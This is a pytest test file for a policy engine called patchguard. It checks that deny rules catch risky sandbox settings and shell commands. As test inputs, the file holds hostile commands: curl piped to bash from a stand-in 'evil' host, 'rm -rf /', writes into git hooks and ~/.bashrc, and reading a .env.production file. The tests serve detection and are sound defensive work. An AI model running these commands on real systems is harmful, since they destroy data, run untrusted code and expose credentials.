"""Tests for PolicyEngine — every default rule must have a positive and negative test."""

from __future__ import annotations

from pathlib import Path

import pytest
from pydantic import ValidationError

from patchguard.exceptions import ConfigurationError
from patchguard.policy.engine import PolicyEngine
from patchguard.policy.models import (
    PolicyDecision,
    PolicyResult,
    PolicyRule,
    PolicyRuleset,
    RiskLevel,
    RuleMatch,
)
from patchguard.policy.rules import (
    evaluate_text_input,
)
from patchguard.sandbox.base import SandboxConfig
from patchguard.sandbox.command_builder import validate_sandbox_config

# -- fixtures --------------------------------------------------------------


@pytest.fixture
def engine() -> PolicyEngine:
    return PolicyEngine.load_defaults()


# -- model tests -----------------------------------------------------------


class TestPolicyModels:
    def test_rule_rejects_unknown_fields(self) -> None:
        with pytest.raises(ValidationError):
            PolicyRule(
                id="r1",
                applies_to="bash",
                match=RuleMatch(regex=".*"),
                decision=PolicyDecision.DENY,
                severity=RiskLevel.HIGH,
                reason="test",
                bogus_field=True,  # type: ignore[call-arg]
            )

    def test_ruleset_rejects_unknown_fields(self) -> None:
        with pytest.raises(ValidationError):
            PolicyRuleset(
                schema_version="1.0",
                rules=[],
                extra_field="nope",  # type: ignore[call-arg]
            )

    def test_match_rejects_unknown_fields(self) -> None:
        with pytest.raises(ValidationError):
            RuleMatch(regex=".*", mystery="x")  # type: ignore[call-arg]

    def test_result_not_matched(self) -> None:
        rule = PolicyRule(
            id="test", applies_to="bash", match=RuleMatch(regex="zzz"),
            decision=PolicyDecision.DENY, severity=RiskLevel.LOW, reason="t",
        )
        r = PolicyResult.not_matched(rule)
        assert not r.matched
        assert r.decision == PolicyDecision.ALLOW

    def test_result_hit(self) -> None:
        rule = PolicyRule(
            id="test", applies_to="bash", match=RuleMatch(regex="zzz"),
            decision=PolicyDecision.DENY, severity=RiskLevel.HIGH, reason="t",
        )
        r = PolicyResult.hit(rule)
        assert r.matched
        assert r.decision == PolicyDecision.DENY


# -- default rules tests (positive = rule fires, negative = no false positive) --


class TestDefaultRules:
    """Each default rule from defaults.yaml must have a positive and negative test."""

    # -- deny-privileged --

    def test_privileged_is_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(privileged=True)
        matched = [r for r in results if r.rule_id == "deny-privileged" and r.matched]
        assert len(matched) == 1
        assert matched[0].decision == PolicyDecision.DENY

    def test_privileged_not_denied_when_false(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(privileged=False)
        r = next(r for r in results if r.rule_id == "deny-privileged")
        assert not r.matched

    # -- deny-host-network --

    def test_host_network_is_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(network="host")
        matched = [r for r in results if r.rule_id == "deny-host-network" and r.matched]
        assert len(matched) == 1

    def test_none_network_not_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(network="none")
        r = next(r for r in results if r.rule_id == "deny-host-network")
        assert not r.matched

    def test_bridge_network_not_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(network="bridge")
        r = next(r for r in results if r.rule_id == "deny-host-network")
        assert not r.matched

    # -- deny-docker-socket --

    def test_docker_socket_mount_is_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(
            mounts=["type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock"]
        )
        matched = [r for r in results if r.rule_id == "deny-docker-socket" and r.matched]
        assert len(matched) == 1

    def test_normal_mount_not_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(
            mounts=["type=bind,src=/tmp/workspace,dst=/workspace,rw"]
        )
        r = next(r for r in results if r.rule_id == "deny-docker-socket")
        assert not r.matched

    # -- deny-host-root-mount --

    def test_host_root_mount_is_denied(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(
            mounts=["type=bind,src=/,dst=/host"]
        )
        matched = [r for r in results if r.rule_id == "deny-host-root-mount" and r.matched]
        assert len(matched) == 1

    def test_workspace_mount_not_matched_as_root(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(
            mounts=["type=bind,src=/tmp/ws,dst=/workspace,rw"]
        )
        r = next(r for r in results if r.rule_id == "deny-host-root-mount")
        assert not r.matched

    # -- deny-git-destructive --

    def test_git_reset_hard_is_denied(self) -> None:
        rule = _get_rule("deny-git-destructive")
        r = evaluate_text_input(rule, "git reset --hard HEAD~1")
        assert r.matched

    def test_git_clean_f_is_denied(self) -> None:
        rule = _get_rule("deny-git-destructive")
        r = evaluate_text_input(rule, "git clean -fd")
        assert r.matched

    def test_git_safe_status_not_denied(self) -> None:
        rule = _get_rule("deny-git-destructive")
        r = evaluate_text_input(rule, "git status")
        assert not r.matched

    def test_git_diff_not_denied(self) -> None:
        rule = _get_rule("deny-git-destructive")
        r = evaluate_text_input(rule, "git diff HEAD")
        assert not r.matched

    # -- deny-rm-protected --

    def test_rm_rf_root_is_denied(self) -> None:
        rule = _get_rule("deny-rm-protected")
        r = evaluate_text_input(rule, "rm -rf /")
        assert r.matched

    def test_rm_rf_home_is_denied(self) -> None:
        rule = _get_rule("deny-rm-protected")
        r = evaluate_text_input(rule, "rm -rf $HOME")
        assert r.matched

    def test_rm_safe_file_not_denied(self) -> None:
        rule = _get_rule("deny-rm-protected")
        r = evaluate_text_input(rule, "rm -rf /workspace/tmp")
        assert not r.matched

    # -- deny-curl-pipe-shell --

    def test_curl_pipe_bash_is_denied(self) -> None:
        rule = _get_rule("deny-curl-pipe-shell")
        r = evaluate_text_input(rule, "curl https://evil | bash")
        assert r.matched

    def test_curl_pipe_sh_is_denied(self) -> None:
        rule = _get_rule("deny-curl-pipe-shell")
        r = evaluate_text_input(rule, "curl -s http://x | sh")
        assert r.matched

    def test_curl_safe_download_not_denied(self) -> None:
        rule = _get_rule("deny-curl-pipe-shell")
        r = evaluate_text_input(rule, "curl -o file.txt https://safe")
        assert not r.matched

    # -- deny-write-git-hooks --

    def test_write_to_git_hooks_is_denied(self) -> None:
        rule = _get_rule("deny-write-git-hooks")
        r = evaluate_text_input(rule, "echo 'evil' > .git/hooks/pre-commit")
        assert r.matched

    def test_read_git_hooks_not_denied(self) -> None:
        rule = _get_rule("deny-write-git-hooks")
        r = evaluate_text_input(rule, "cat .git/hooks/pre-commit")
        assert not r.matched

    # -- deny-modify-shell-profile --

    def test_modify_bashrc_is_denied(self) -> None:
        rule = _get_rule("deny-modify-shell-profile")
        r = evaluate_text_input(rule, "echo 'evil' >> ~/.bashrc")
        assert r.matched

    def test_cat_bashrc_not_denied(self) -> None:
        rule = _get_rule("deny-modify-shell-profile")
        r = evaluate_text_input(rule, "cat ~/.bashrc")
        assert not r.matched

    # -- deny-read-credentials --

    def test_read_env_file_is_denied(self) -> None:
        rule = _get_rule("deny-read-credentials")
        r = evaluate_text_input(rule, "cat .env.production")
        assert r.matched

    def test_read_normal_file_not_denied(self) -> None:
        rule = _get_rule("deny-read-credentials")
        r = evaluate_text_input(rule, "cat README.md")
        assert not r.matched

    # -- deny-fork-bomb --

    def test_fork_bomb_is_denied(self) -> None:
        rule = _get_rule("deny-fork-bomb")
        r = evaluate_text_input(rule, "fork bomb detected")
        assert r.matched

    def test_normal_loop_not_denied(self) -> None:
        rule = _get_rule("deny-fork-bomb")
        r = evaluate_text_input(rule, "for f in *.txt; do echo $f; done")
        assert not r.matched

    # -- deny-very-long-command --

    def test_very_long_command_is_denied(self) -> None:
        rule = _get_rule("deny-very-long-command")
        long_cmd = "x" * 10001
        r = evaluate_text_input(rule, long_cmd)
        assert r.matched

    def test_normal_length_command_not_denied(self) -> None:
        rule = _get_rule("deny-very-long-command")
        r = evaluate_text_input(rule, "echo hello")
        assert not r.matched

    # -- engine-level tests --

    def test_default_engine_has_all_12_rules(self, engine: PolicyEngine) -> None:
        assert len(engine.rules) == 12

    def test_any_denied_empty_results(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox()
        assert not engine.any_denied(results)

    def test_findings_format(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_sandbox(privileged=True)
        findings = engine.findings(results)
        assert any("deny-privileged" in f for f in findings)

    def test_command_evaluation(self, engine: PolicyEngine) -> None:
        results = engine.evaluate_command("git reset --hard HEAD~1")
        matched = [r for r in results if r.matched]
        assert any(r.rule_id == "deny-git-destructive" for r in matched)


# -- integration: validate_sandbox_config uses policy --


class TestPolicyIntegration:
    def test_safe_config_passes_policy_check(self) -> None:
        config = SandboxConfig(
            image="alpine", command=["echo"], workspace=Path("/tmp/ws"),
            run_id="r1", network="none",
        )
        validate_sandbox_config(config)  # should not raise

    def test_host_network_rejected_by_policy(self) -> None:
        config = SandboxConfig(
            image="alpine", command=["echo"], workspace=Path("/tmp/ws"),
            run_id="r1", network="host",
        )
        with pytest.raises(ConfigurationError, match="Invalid network mode"):
            validate_sandbox_config(config)


# -- helpers --


def _get_rule(rule_id: str) -> PolicyRule:
    engine = PolicyEngine.load_defaults()
    for r in engine.rules:
        if r.id == rule_id:
            return r
    raise ValueError(f"Rule {rule_id} not found")
